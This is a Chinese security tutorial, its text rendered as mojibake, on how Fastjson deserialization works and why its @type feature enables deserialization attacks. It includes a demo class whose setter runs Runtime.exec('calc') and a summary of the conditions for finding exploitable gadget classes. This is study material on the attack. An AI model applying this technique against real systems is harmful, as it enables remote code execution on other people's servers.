<p>Fastjson åˆ©ç”¨<code>toJSONString</code>æ–¹æ³•æ¥åºåˆ—åŒ–å¯¹è±¡ï¼Œ<code>SerializerFeature.WriteClassName</code>æ˜¯<code>JSON.toJSONString()</code>ä¸­çš„ä¸€ä¸ªè®¾ç½®å±æ€§å€¼ï¼Œè®¾ç½®ä¹‹ååœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¤šå†™å…¥ä¸€ä¸ª<code>@type</code>ï¼Œå³å†™å…¥è¢«åºåˆ—åŒ–çš„ç±»åã€‚type å¯ä»¥æŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œå¹¶ä¸”è°ƒç”¨å…¶<code>getter</code>/<code>setter</code>/<code>is</code>æ–¹æ³•ï¼Œè€Œé—®é¢˜æ°æ°å‡ºåœ¨è¿™ä¸ªç‰¹æ€§ï¼ŒFastjsonæ¥æ”¶çš„ JSON å¯ä»¥é€šè¿‡<code>@type</code>å­—æ®µæ¥æŒ‡å®šååºåˆ—åŒ–æ—¶è¯¥ JSON åº”å½“è¿˜åŸæˆä½•ç§ç±»å‹çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é…åˆä¸€äº›å­˜åœ¨é—®é¢˜çš„ç±»ï¼Œè¿›ä¸€æ­¥é€ æˆ RCEã€‚</p>
<p>æ‰§è¡Œ<code>TestFastJson.java</code>è¾“å‡ºï¼š</p>
<pre class="line-numbers language-none"><code class="language-none"># è®¾ç½®äº†SerializerFeature.WriteClassNameå±æ€§
Studentæ„é€ å‡½æ•°
Student setName
Student setAge
Student getAge
Student getName
{"@type":"fastjson.Student","age":18,"name":"Hello Fastjson!"}

# æœªè®¾ç½®SerializerFeature.WriteClassNameå±æ€§
Studentæ„é€ å‡½æ•°
Student setName
Student setAge
Student getAge
Student getName
{"age":18,"name":"Hello Fastjson!"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="JSON-parseObject-å’ŒJSON-parse"><a href="#JSON-parseObject-å’ŒJSON-parse" class="headerlink" title="JSON.parseObject()å’ŒJSON.parse()"></a><code>JSON.parseObject()</code>å’Œ<code>JSON.parse()</code></h4><p>ååºåˆ—åŒ–çš„APIä¸»è¦æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯<code>JSON.parseObject()</code>å’Œ<code>JSON.parse()</code>ï¼Œæœ€ä¸»è¦çš„åŒºåˆ«å°±æ˜¯<code>JSON.parseObject()</code>åœ¨<strong>æœªæŒ‡å®šç›®æ ‡ç±»çš„å‰æä¸‹</strong>è¿”å›çš„æ˜¯ JSONObjectï¼Œè€Œ<code>JSON.parse()</code>è¿”å›çš„æ˜¯å®é™…ç±»çš„å¯¹è±¡ã€‚</p>
<p><code>parseObject()</code>æœ¬è´¨ä¸Šä¹Ÿæ˜¯è°ƒç”¨<code>parse()</code>è¿›è¡Œååºåˆ—åŒ–çš„ã€‚ä½†æ˜¯<code>parseObject()</code>ä¼šé¢å¤–å°† Java å¯¹è±¡è½¬ä¸º JSONObject å¯¹è±¡ï¼Œå³<code>JSON.toJSON(obj)</code>ã€‚</p>
<p>æ‰€ä»¥ååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼š</p>
<p><code>parse()</code>ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•åŠ<strong>æŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³•</strong>ï¼›</p>
<p>è€Œ<code>parseObject()</code>ç”±äºå¤šæ‰§è¡Œäº†<code>JSON.toJSON(obj)</code>ï¼Œå› æ­¤åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„<strong>æ‰€æœ‰ setter å’Œ getter æ–¹æ³•</strong>ã€‚</p>
<p><code>TestFastJsonDeserialize.class</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFastJsonDeserialize</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"é€šè¿‡parseObjectæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼ŒæœªæŒ‡å®šclassï¼Œè¿”å›ä¸€ä¸ªJSONObjectå¯¹è±¡ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"é€šè¿‡parseObjectæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼ŒæŒ‡å®šclassï¼Œè¿”å›ç›¸åº”çš„ç±»ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj02 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj02<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj02<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"é€šè¿‡parseæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿”å›ç›¸åº”çš„ç±»ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj03 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">)</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj03<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj03<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¾“å‡ºï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">é€šè¿‡parseObjectæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼ŒæœªæŒ‡å®šclassï¼Œè¿”å›ä¸€ä¸ªJSONObjectå¯¹è±¡ï¼š
Studentæ„é€ å‡½æ•°
Student setAge
Student setName
Student getAge
Student getName
{"name":"Hello Fastjson!","age":18}
com.alibaba.fastjson.JSONObject

é€šè¿‡parseObjectæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼ŒæŒ‡å®šclassï¼Œè¿”å›ç›¸åº”çš„ç±»ï¼š
Studentæ„é€ å‡½æ•°
Student setAge
Student setName
fastjson.Student@2957fcb0
fastjson.Student

é€šè¿‡parseæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿”å›ç›¸åº”çš„ç±»ï¼š
Studentæ„é€ å‡½æ•°
Student setAge
Student setName
fastjson.Student@1376c05c
fastjson.Student<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="parseObject-æ–¹æ³•çš„Feature-SupportNonPublicFieldå±æ€§"><a href="#parseObject-æ–¹æ³•çš„Feature-SupportNonPublicFieldå±æ€§" class="headerlink" title="parseObject()æ–¹æ³•çš„Feature.SupportNonPublicFieldå±æ€§"></a><code>parseObject()</code>æ–¹æ³•çš„<code>Feature.SupportNonPublicField</code>å±æ€§</h4><p>Fastjsoné»˜è®¤ä¸ä¼šååºåˆ—åŒ–ç§æœ‰å±æ€§ï¼Œè‹¥æƒ³å¯¹ç§æœ‰å±æ€§è¿›è¡Œååºåˆ—åŒ–ï¼Œåˆ™éœ€è¦åœ¨<code>parseObject()</code>æ–¹æ³•æ·»åŠ ä¸€ä¸ªå±æ€§<code>Feature.SupportNonPublicField</code>ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<p>æˆ‘ä»¬ç¨å¾®ä¿®æ”¹ä¸€ä¸‹<code>Student</code>ç±»ï¼ŒæŠŠç§æœ‰å±æ€§ageçš„<code>setter</code>æ–¹æ³•å»æ‰ï¼ˆå¦‚æœä¸å»æ‰ï¼ŒFastjsonä¾ç„¶æ˜¯èƒ½ååºåˆ—åŒ–æˆåŠŸçš„ï¼Œå› ä¸ºä½ æä¾›äº†è¿™ä¸ªæ¥å£ï¼‰ï¼Œä½œä¸ºå¯¹æ¯”ï¼Œæˆ‘ä»¬æŠŠnameå±æ€§è®¾ç½®ä¸º<code>public</code>ï¼Œå¹¶ä¸”ä¹Ÿæ³¨é‡Šæ‰<code>setter</code>æ–¹æ³•ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
<span class="token comment">//    private String name;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Studentæ„é€ å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment">/*    public void setName(String name) {
        System.out.println("Student setName");
        this.name = name;
    }*/</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment">/*    public void setAge(int age) {
        System.out.println("Student setAge");
        this.age = age;
    }*/</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åååºåˆ—åŒ–ï¼ˆæ³¨æ„å°†<code>TestFastJson.java</code>å…¨éƒ¨æ³¨é‡Šæ‰ï¼‰ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>
<span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj04 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> obj04<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¾“å‡ºå¦‚ä¸‹ï¼Œå‘ç°æœªè®¾ç½®<code>Feature.SupportNonPublicField</code>æ—¶ï¼Œç§æœ‰å±æ€§ageä¸º0ï¼Œå³æ²¡æœ‰èµ‹å€¼æˆåŠŸï¼Œè€ŒåŒæ ·æ²¡æœ‰<code>setter</code>æ–¹æ³•çš„å…¬æœ‰å±æ€§nameå´å¯ä»¥èµ‹å€¼æˆåŠŸã€‚</p>
<pre class="line-numbers language-none"><code class="language-none"># è®¾ç½®äº†Feature.SupportNonPublicFieldå±æ€§
Studentæ„é€ å‡½æ•°
fastjson.Student@2d8e6db6
fastjson.Student
Student getName
Student getAge
Hello Fastjson! 18

# æœªè®¾ç½®Feature.SupportNonPublicFieldå±æ€§
Studentæ„é€ å‡½æ•°
fastjson.Student@2d8e6db6
fastjson.Student
Student getName
Student getAge
Hello Fastjson! 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#Fastjsonååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="Fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"></a>Fastjsonååºåˆ—åŒ–æ¼æ´åŸç†</h2><p>ä»å‰æ–‡å¯çŸ¥ï¼ŒFastjsonæ˜¯è‡ªå·±å®ç°çš„ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œä¸æ˜¯ç”¨çš„JavaåŸç”Ÿçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ã€‚</p>
<p>æ— è®ºæ˜¯å“ªä¸ªç‰ˆæœ¬ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ä¸åŒç‰ˆæœ¬æ˜¯é’ˆå¯¹ä¸åŒçš„é»‘åå•æˆ–è€…å€ŸåŠ©ä¸åŒåˆ©ç”¨é“¾æ¥è¿›è¡Œç»•è¿‡åˆ©ç”¨è€Œå·²ã€‚</p>
<p><strong>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½æ‰¾åˆ°è¿™ç§æœ‰å±é™©æ“ä½œçš„ç±»å‘¢ï¼Ÿ</strong></p>
<p>å‰æ–‡ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“Fastjsonä½¿ç”¨<code>parseObject()</code>/<code>parse()</code>è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥æŒ‡å®šç±»å‹ã€‚ã€‚æœ‰ä¸¤ç§æƒ…å†µæˆ‘ä»¬æœ‰å¯ä¹˜ä¹‹æœºï¼š</p>
<p>1ã€ååºåˆ—åŒ–æŒ‡å®šæŸä¸ªå…·ä½“ç±»ï¼Œå¼€å‘è€…å®ç°çš„è¿™ä¸ªå…·ä½“ç±»ä¸­å°±åŒ…å«äº†å±é™©æ“ä½œï¼›</p>
<p>2ã€ååºåˆ—åŒ–æŒ‡å®šçš„ç±»å¾ˆå¤§ï¼ŒåŒ…å«äº†å¾ˆå¤šå­ç±»ï¼Œå¹¶ä¸”åœ¨ä¸åœ¨ååºåˆ—åŒ–çš„é»‘åå•å†…ã€‚æç«¯æƒ…å†µï¼Œå¦‚Objectæˆ–JSONObjectï¼Œåˆ™å¯ä»¥ååºåˆ—åŒ–å‡ºæ¥ä»»æ„ç±»ã€‚ä¾‹å¦‚ä»£ç <code>Object o = JSON.parseObject(poc,Object.class)</code>å°±å¯ä»¥ååºåˆ—åŒ–å‡ºObjectç±»æˆ–å…¶ä»»æ„å­ç±»ï¼Œè€ŒObjectåˆæ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œæ‰€ä»¥å°±å¯ä»¥ååºåˆ—åŒ–å‡ºæ‰€æœ‰ç±»ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¸¦æœ‰å±é™©æ“ä½œçš„ç±»å°±ä¼šæœ‰å¾ˆå¤šã€‚</p>
<p><strong>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„å±é™©æ“ä½œç±»ä¸­çš„å±é™©å‡½æ•°å‘¢ï¼Ÿ</strong></p>
<p>ä»å‰æ–‡å¯çŸ¥ï¼ŒFastjsonåœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¯èƒ½ä¼šå°†ç›®æ ‡ç±»çš„æ„é€ å‡½æ•°ã€<code>getter</code>æ–¹æ³•ã€<code>setter</code>æ–¹æ³•ã€<code>is</code>æ–¹æ³•æ‰§è¡Œä¸€éï¼Œå¦‚æœæ­¤æ—¶è¿™å››ä¸ªæ–¹æ³•ä¸­æœ‰å±é™©æ“ä½œï¼Œå°±ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯æ”»å‡»è€…ä¼ å…¥è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»ä¸­çš„æ„é€ å‡½æ•°ã€<code>getter</code>æ–¹æ³•ã€<code>setter</code>æ–¹æ³•ã€<code>is</code>æ–¹æ³•ä¸­è¦å­˜åœ¨æ¼æ´æ‰èƒ½è§¦å‘ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<p>æˆ‘ä»¬åœ¨setName()å‡½æ•°ä¸­åŠ å…¥äº†ä¸€ä¸ªå±é™©æ“ä½œï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
<span class="token comment">//    private String name;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Studentæ„é€ å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment">/*    public void setAge(int age) {
        System.out.println("Student setAge");
        this.age = age;
    }*/</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åååºåˆ—åŒ–ï¼Œä¾¿å¯å¼¹å‡ºè®¡ç®—å™¨</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>
<span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj04 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> obj04<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175346825.png"></p>
<p>ä¸Šè¿°å°±æ˜¯ååºåˆ—åŒ–å…·ä½“ç±»çš„åœºæ™¯ï¼Œè‹¥æ˜¯ååºåˆ—åŒ–ä¸€ä¸ªå¤§ç±»ï¼ˆæŠ½è±¡ç±»ï¼‰å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">Object obj04 = JSON.parseObject(jsonString, Object.class, Feature.SupportNonPublicField);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°ç»“ä¸€ä¸‹ï¼Œå…³é”®æ˜¯è¦æ‰¾å‡ºä¸€ä¸ªåœ¨ç›®æ ‡ç¯å¢ƒä¸­å·²å­˜åœ¨çš„ç±»ï¼Œæ»¡è¶³å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ol>
<li>è¯¥ç±»çš„æ„é€ å‡½æ•°ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•ã€<code>is</code>æ–¹æ³•ä¸­çš„æŸä¸€ä¸ªå­˜åœ¨å±é™©æ“ä½œï¼›</li>
<li>å¯ä»¥æ§åˆ¶è¯¥æ¼æ´å‡½æ•°çš„å˜é‡ï¼ˆä¸€èˆ¬å°±æ˜¯è¯¥ç±»çš„å±æ€§ï¼‰ï¼›</li>
</ol>
